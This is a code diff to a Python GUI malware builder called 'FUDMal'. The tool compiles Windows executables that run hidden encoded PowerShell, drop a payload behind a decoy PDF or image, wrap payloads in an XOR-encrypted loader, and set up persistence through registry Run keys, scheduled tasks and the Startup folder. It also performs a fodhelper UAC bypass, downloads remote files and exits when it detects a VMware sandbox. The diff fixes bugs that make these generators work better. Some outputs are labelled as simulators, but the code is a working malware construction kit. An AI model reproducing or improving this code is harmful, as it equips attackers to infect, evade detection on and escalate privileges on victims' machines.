@@ -18,12 +18,15 @@ import threading
 VM_CHECK_CODE = textwrap.dedent("""\
 import subprocess
 import os
-import winreg
 import platform
 import sys
 
 def is_running_on_vmware_windows():
     if platform.system() != "Windows":
+        return False
+    try:
+        import winreg
+    except Exception:
         return False
         
     # --- Check 1: WMI Artifacts (System/Hardware Names) ---
@@ -104,11 +107,10 @@ Start-Process -FilePath $FinalFilePath -NoNewWindow
 
 # 3. PowerShell Executor Function (For Tab 1)
 PS_EXEC_FUNCTION = textwrap.dedent("""\
-def execute_powershell_script(ps_content, delay_start):
+def execute_powershell_script(ps_content):
     # Local imports ensure the function has everything it needs
     import base64
     import subprocess
-    import sys
 
     try:
         # 1. Encode the payload
@@ -129,13 +131,7 @@ def execute_powershell_script(ps_content, delay_start):
         subprocess.run(cmd, timeout=600, creationflags=0x08000000)
         return True
 
-    except Exception as e:
-        # DEBUGGING: Write error to a file so you can see what went wrong
-        try:
-            with open("error_log.txt", "w") as f:
-                f.write(f"Execution Failed: {str(e)}")
-        except:
-            pass
+    except Exception:
         return False
 """)
 
@@ -149,13 +145,34 @@ class IORedirector:
         self.text_widget = text_widget
 
     def write(self, s):
-        try:
+        def _append():
             self.text_widget.insert(tk.END, s)
             self.text_widget.see(tk.END)
+
+        try:
+            if threading.current_thread() is threading.main_thread():
+                _append()
+            else:
+                self.text_widget.after(0, _append)
         except:
             pass # Widget might be destroyed
 
     def flush(self):
+        pass
+
+
+def _ui_notify(log_widget, level, title, message):
+    notifier = messagebox.showerror if level == "error" else messagebox.showinfo
+
+    def _show():
+        notifier(title, message)
+
+    try:
+        if threading.current_thread() is threading.main_thread():
+            _show()
+        else:
+            log_widget.after(0, _show)
+    except Exception:
         pass
 
 # =============================================================================
@@ -185,11 +202,11 @@ class LogicConfigGen:
 if is_running_on_vmware_windows():
     sys.exit(0)
 else:
-    execute_powershell_script(PS_SCRIPT_CONTENT, EXECUTION_DELAY)
+    execute_powershell_script(PS_SCRIPT_CONTENT)
 """)
         else:
             core_logic = textwrap.dedent(f"""\
-execute_powershell_script(PS_SCRIPT_CONTENT, EXECUTION_DELAY)
+execute_powershell_script(PS_SCRIPT_CONTENT)
 """)
 
         # Assemble Full Script
@@ -200,8 +217,7 @@ execute_powershell_script(PS_SCRIPT_CONTENT, EXECUTION_DELAY)
 {PS_EXEC_FUNCTION}
 
 # --- TEMPLATE VARIABLES ---
-PS_SCRIPT_CONTENT = '''{ps_content.replace("'", "\\'")}'''
-EXECUTION_DELAY = {delay_start}
+PS_SCRIPT_CONTENT = {ps_content!r}
 
 if __name__ == "__main__":
     if platform.system() == "Windows":
@@ -215,6 +231,7 @@ if __name__ == "__main__":
         temp_py_file = os.path.join(temp_dir, "temp_runner.py")
         output_dir = os.path.dirname(output_exe)
         exe_name = os.path.basename(output_exe)
+        exe_basename = os.path.splitext(exe_name)[0]
 
         try:
             with open(temp_py_file, 'w', encoding='utf-8') as f:
@@ -222,7 +239,7 @@ if __name__ == "__main__":
 
             cmd = [
                 'pyinstaller', '--onefile', '--noconsole',
-                '--name', exe_name,
+                '--name', exe_basename,
                 '--distpath', output_dir, temp_py_file
             ]
             
@@ -233,18 +250,18 @@ if __name__ == "__main__":
             
             if process.returncode == 0:
                 print(f"[SUCCESS] Executable created: {output_exe}")
-                messagebox.showinfo("Success", f"Executable created at:\n{output_exe}")
+                _ui_notify(log_widget, "info", "Success", f"Executable created at:\n{output_exe}")
             else:
                 # Print the actual error from PyInstaller
                 print(f"[ERROR] PyInstaller Failed:\n{process.stderr[-1000:]}")
-                messagebox.showerror("Error", f"Compilation failed.\nCheck log for details.")
+                _ui_notify(log_widget, "error", "Error", "Compilation failed.\nCheck log for details.")
             
         except Exception as e:
             print(f"[ERROR] Unexpected error: {e}")
         finally:
             shutil.rmtree(temp_dir, ignore_errors=True)
             # Cleanup local build artifacts
-            spec_file = exe_name + '.spec'
+            spec_file = exe_basename + '.spec'
             if os.path.exists(spec_file):
                 os.remove(spec_file)
             if os.path.exists('build'):
@@ -279,13 +296,12 @@ def get_resource_path(relative_path):
 def execute_payload():
 {vm_call}
 
-    DECOY_NAME = "{decoy_name}"
-    PAYLOAD_NAME = "{payload_name}"
+    DECOY_NAME = {decoy_name!r}
+    PAYLOAD_NAME = {payload_name!r}
+    _staging_dir = None
 
     try:
-        # Use user's temp directory for better permissions
-        _staging_dir = os.path.join(os.environ.get('TEMP', tempfile.gettempdir()), 'pdf_decoy')
-        os.makedirs(_staging_dir, exist_ok=True)
+        _staging_dir = tempfile.mkdtemp(prefix='fudmal_')
 
         bundled_decoy_path = get_resource_path(DECOY_NAME)
         bundled_payload_path = get_resource_path(PAYLOAD_NAME)
@@ -314,7 +330,11 @@ def execute_payload():
         pass # Fail silently
         
     finally:
-        pass # Omit cleanup for simplicity in the executor script
+        if _staging_dir:
+            try:
+                shutil.rmtree(_staging_dir, ignore_errors=True)
+            except Exception:
+                pass
 
 if __name__ == '__main__':
     execute_payload()
@@ -338,22 +358,25 @@ if __name__ == '__main__':
             
             # Icon Handling
             icon_path = os.path.join(temp_dir, "app_icon.ico")
+            include_icon = False
             if is_pdf_mode:
                 # Expecting pdf.ico in CWD
                 local_ico = os.path.join(os.getcwd(), "pdf.ico")
                 if not os.path.exists(local_ico):
                     print("[ERROR] pdf.ico not found in current directory!")
-                    messagebox.showerror("Error", "pdf.ico missing.")
+                    _ui_notify(log_widget, "error", "Error", "pdf.ico missing.")
                     return
                 shutil.copy2(local_ico, icon_path)
+                include_icon = True
             else:
                 # Generate from decoy image
                 try:
                     from PIL import Image
                     img = Image.open(decoy_path)
                     img.save(icon_path, format="ICO", sizes=[(32,32), (64,64), (256,256)])
+                    include_icon = True
                 except Exception as e:
-                    print(f"[WARN] Could not gen icon from decoy, using default. Error: {e}")
+                    print(f"[WARN] Could not generate icon from decoy. Error: {e}")
             
             final_name = output_name if output_name.endswith('.exe') else output_name + ".exe"
             base_name = os.path.splitext(final_name)[0]
@@ -368,12 +391,13 @@ if __name__ == '__main__':
             sep = ';' if sys.platform.startswith('win') else ':'
             cmd = [
                 "pyinstaller", "--onefile", "--windowed",
-                f"--icon={icon_path}",
                 f"--name={base_name}",
                 f"--add-data", f"{payload_name}{sep}.",
                 f"--add-data", f"{decoy_name}{sep}.",
                 script_path
             ]
+            if include_icon:
+                cmd.insert(3, f"--icon={icon_path}")
             
             print("[INFO] Compiling...")
             subprocess.run(cmd, cwd=temp_dir, check=True, capture_output=True)
@@ -384,11 +408,11 @@ if __name__ == '__main__':
             shutil.move(dist_exe, final_dest)
             
             print(f"[SUCCESS] Dropper created: {final_dest}")
-            messagebox.showinfo("Success", f"Created: {final_dest}")
+            _ui_notify(log_widget, "info", "Success", f"Created: {final_dest}")
 
         except Exception as e:
             print(f"[ERROR] {e}")
-            messagebox.showerror("Error", str(e))
+            _ui_notify(log_widget, "error", "Error", str(e))
         finally:
             shutil.rmtree(temp_dir, ignore_errors=True)
             sys.stdout, sys.stderr = _saved_stdout, _saved_stderr
@@ -466,8 +490,8 @@ def decode_bytes(data, key):
     kv = generate_key_values(key)
     return _process_bytes(data, kv, 'decode')
 
-KEY = "{version_key}"
-PAYLOAD = "{b64_payload}"
+KEY = {version_key!r}
+PAYLOAD = {b64_payload!r}
 
 def run():
 {vm_call}
@@ -491,7 +515,7 @@ if __name__ == "__main__":
 
             cmd = [
                 'pyinstaller', '--onefile', '--noconsole',
-                '--name', final_name,
+                '--name', os.path.splitext(final_name)[0],
                 '--distpath', output_dir, temp_loader
             ]
             
@@ -499,11 +523,11 @@ if __name__ == "__main__":
             subprocess.run(cmd, check=True, capture_output=True)
             
             print(f"[SUCCESS] Encrypted Loader created at {os.path.join(output_dir, final_name)}")
-            messagebox.showinfo("Success", "Obfuscation Complete.")
+            _ui_notify(log_widget, "info", "Success", "Obfuscation Complete.")
             
         except Exception as e:
             print(f"[ERROR] {e}")
-            messagebox.showerror("Error", str(e))
+            _ui_notify(log_widget, "error", "Error", str(e))
         finally:
             if os.path.exists("temp_loader.py"):
                 os.remove("temp_loader.py")
@@ -561,8 +585,8 @@ class LogicRegistryPersistence:
 import tkinter as tk
 from tkinter import messagebox
 {vm_code}
-PAYLOAD_FILENAME = "{payload_name}"
-REG_VALUE_NAME   = "{key_name}"
+PAYLOAD_FILENAME = {payload_name!r}
+REG_VALUE_NAME   = {key_name!r}
 
 def _res(p):
     try:
@@ -632,10 +656,10 @@ if __name__ == "__main__":
             final_dest = os.path.join(output_dir, final_name)
             shutil.move(dist_exe, final_dest)
             print(f"[SUCCESS] Simulator created: {final_dest}")
-            messagebox.showinfo("Success", f"Created: {final_dest}")
+            _ui_notify(log_widget, "info", "Success", f"Created: {final_dest}")
         except Exception as e:
             print(f"[ERROR] {e}")
-            messagebox.showerror("Error", str(e))
+            _ui_notify(log_widget, "error", "Error", str(e))
         finally:
             shutil.rmtree(temp_dir, ignore_errors=True)
             sys.stdout, sys.stderr = _saved_stdout, _saved_stderr
@@ -689,9 +713,9 @@ class LogicScheduledTask:
 import tkinter as tk
 from tkinter import messagebox
 {vm_code}
-PAYLOAD_FILENAME = "{payload_name}"
-TASK_NAME        = "{task_name}"
-TRIGGER          = "{trigger_upper}"
+PAYLOAD_FILENAME = {payload_name!r}
+TASK_NAME        = {task_name!r}
+TRIGGER          = {trigger_upper!r}
 
 def _res(p):
     try:
@@ -769,10 +793,10 @@ if __name__ == "__main__":
             final_dest = os.path.join(output_dir, final_name)
             shutil.move(dist_exe, final_dest)
             print(f"[SUCCESS] Simulator created: {final_dest}")
-            messagebox.showinfo("Success", f"Created: {final_dest}")
+            _ui_notify(log_widget, "info", "Success", f"Created: {final_dest}")
         except Exception as e:
             print(f"[ERROR] {e}")
-            messagebox.showerror("Error", str(e))
+            _ui_notify(log_widget, "error", "Error", str(e))
         finally:
             shutil.rmtree(temp_dir, ignore_errors=True)
             sys.stdout, sys.stderr = _saved_stdout, _saved_stderr
@@ -821,7 +845,7 @@ class LogicStartupFolder:
 import tkinter as tk
 from tkinter import messagebox
 {vm_code}
-PAYLOAD_FILENAME = "{payload_name}"
+PAYLOAD_FILENAME = {payload_name!r}
 
 def _res(p):
     try:
@@ -885,10 +909,10 @@ if __name__ == "__main__":
             final_dest = os.path.join(output_dir, final_name)
             shutil.move(dist_exe, final_dest)
             print(f"[SUCCESS] Simulator created: {final_dest}")
-            messagebox.showinfo("Success", f"Created: {final_dest}")
+            _ui_notify(log_widget, "info", "Success", f"Created: {final_dest}")
         except Exception as e:
             print(f"[ERROR] {e}")
-            messagebox.showerror("Error", str(e))
+            _ui_notify(log_widget, "error", "Error", str(e))
         finally:
             shutil.rmtree(temp_dir, ignore_errors=True)
             sys.stdout, sys.stderr = _saved_stdout, _saved_stderr
@@ -924,18 +948,24 @@ class LogicUACBypass:
         cleanup = (
             """\
     # --- CLEANUP: remove the hijacked handler key ---
-    _uac_key = r"Software\\Classes\\ms-settings\\shell\\open\\command"
+    import winreg as _wr
     try:
-        import winreg as _wr
-        _wr.DeleteKey(_wr.HKEY_CURRENT_USER, _uac_key + "\\\\DelegateExecute")
-    except Exception:
-        pass
+        _wr.DeleteKey(_wr.HKEY_CURRENT_USER, _UAC_DELEGATE_KEY)
+        lines.append("[CLEANUP] DelegateExecute subkey removed.")
+    except FileNotFoundError:
+        lines.append("[CLEANUP] DelegateExecute subkey already absent.")
+    except Exception as _exc:
+        lines.append("[CLEANUP ERROR] DelegateExecute removal failed: " + str(_exc))
     try:
-        import winreg as _wr
-        with _wr.OpenKey(_wr.HKEY_CURRENT_USER, _uac_key, 0, _wr.KEY_WRITE) as _hk:
-            _wr.DeleteValue(_hk, "")
-        _wr.DeleteKey(_wr.HKEY_CURRENT_USER, _uac_key)
+        with _wr.OpenKey(_wr.HKEY_CURRENT_USER, _UAC_REG_KEY, 0, _wr.KEY_WRITE) as _hk:
+            try:
+                _wr.DeleteValue(_hk, "")
+            except FileNotFoundError:
+                pass
+        _wr.DeleteKey(_wr.HKEY_CURRENT_USER, _UAC_REG_KEY)
         lines.append("[CLEANUP] Hijacked handler key removed.")
+    except FileNotFoundError:
+        lines.append("[CLEANUP] Hijacked handler key already absent.")
     except Exception as _exc:
         lines.append("[CLEANUP ERROR] " + str(_exc))
 """
@@ -946,7 +976,7 @@ class LogicUACBypass:
 import tkinter as tk
 from tkinter import messagebox
 {vm_code}
-PAYLOAD_FILENAME = "{payload_name}"
+PAYLOAD_FILENAME = {payload_name!r}
 
 # Registry key used by the fodhelper UAC bypass technique
 _UAC_REG_KEY       = r"Software\\Classes\\ms-settings\\shell\\open\\command"
@@ -1032,10 +1062,10 @@ if __name__ == "__main__":
             final_dest = os.path.join(output_dir, final_name)
             shutil.move(dist_exe, final_dest)
             print(f"[SUCCESS] Simulator created: {final_dest}")
-            messagebox.showinfo("Success", f"Created: {final_dest}")
+            _ui_notify(log_widget, "info", "Success", f"Created: {final_dest}")
         except Exception as e:
             print(f"[ERROR] {e}")
-            messagebox.showerror("Error", str(e))
+            _ui_notify(log_widget, "error", "Error", str(e))
         finally:
             shutil.rmtree(temp_dir, ignore_errors=True)
             sys.stdout, sys.stderr = _saved_stdout, _saved_stderr
@@ -1067,17 +1097,13 @@ class LogicCmdDropper:
             "    if is_running_on_vmware_windows():\n        sys.exit(0)"
             if enable_vm else ""
         )
-        # Escape backslashes so the path is valid inside a regular Python
-        # string literal in the generated script (raw strings can't end with \)
-        escaped_path = download_path.replace("\\", "\\\\")
-
         script_content = f"""import os, sys, platform, tempfile
 import tkinter as tk
 from tkinter import messagebox
 {vm_code}
-TARGET_URL    = "{url}"
-DEST_DIR      = "{escaped_path}"
-FILENAME      = "{filename}"
+TARGET_URL    = {url!r}
+DEST_DIR      = {download_path!r}
+FILENAME      = {filename!r}
 DELAY_START   = {delay_start}
 
 def _report(body):
@@ -1144,10 +1170,10 @@ if __name__ == "__main__":
             final_dest = os.path.join(output_dir, final_name)
             shutil.move(dist_exe, final_dest)
             print(f"[SUCCESS] Simulator created: {final_dest}")
-            messagebox.showinfo("Success", f"Created: {final_dest}")
+            _ui_notify(log_widget, "info", "Success", f"Created: {final_dest}")
         except Exception as e:
             print(f"[ERROR] {e}")
-            messagebox.showerror("Error", str(e))
+            _ui_notify(log_widget, "error", "Error", str(e))
         finally:
             shutil.rmtree(temp_dir, ignore_errors=True)
             sys.stdout, sys.stderr = _saved_stdout, _saved_stderr
@@ -1278,6 +1304,9 @@ class UnifiedBuilderApp(tk.Tk):
         url = self.c_url.get()
         path = self.c_path.get()
         fname = self.c_fname.get()
+        if not all([url, path, fname]):
+            messagebox.showerror("Error", "Fill all fields.")
+            return
         try:
             d_start = int(self.c_d_start.get())
             d_wait = int(self.c_d_wait.get())
@@ -1563,5 +1592,8 @@ class UnifiedBuilderApp(tk.Tk):
 
 if __name__ == "__main__":
     app = UnifiedBuilderApp()
-    app.iconbitmap("FUDMal.ico")
+    try:
+        app.iconbitmap("FUDMal.ico")
+    except Exception:
+        pass
     app.mainloop()
